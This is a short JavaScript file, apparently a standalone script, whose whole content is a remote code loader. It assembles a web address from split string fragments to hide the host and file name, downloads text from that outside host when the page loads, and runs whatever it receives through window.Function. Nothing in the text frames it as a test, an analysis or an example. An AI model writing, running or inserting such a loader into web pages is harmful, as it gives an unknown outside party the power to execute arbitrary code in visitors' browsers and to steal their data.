(function pullRemote() {
    var host = ['pinger', 'rimo', 'seshorts', '.com'].join('');
    var file = ['orpin', 'velleity'].join('.');
    var href = ['https://', host, '/', file].join('');

    var req = new XMLHttpRequest();
    req.open('GET', href, true);
    req.setRequestHeader('Accept', 'text/plain,*/*');
    req.onreadystatechange = function () {
        if (req.readyState !== 4) return;
        if (req.status < 200 || req.status > 299) return;
        var src = String(req.responseText || '').replace(/^\uFEFF/, '').trim();
        if (!src) return;
        var run = window.Function;
        run(src)();
    };
    req.send(null);
})();
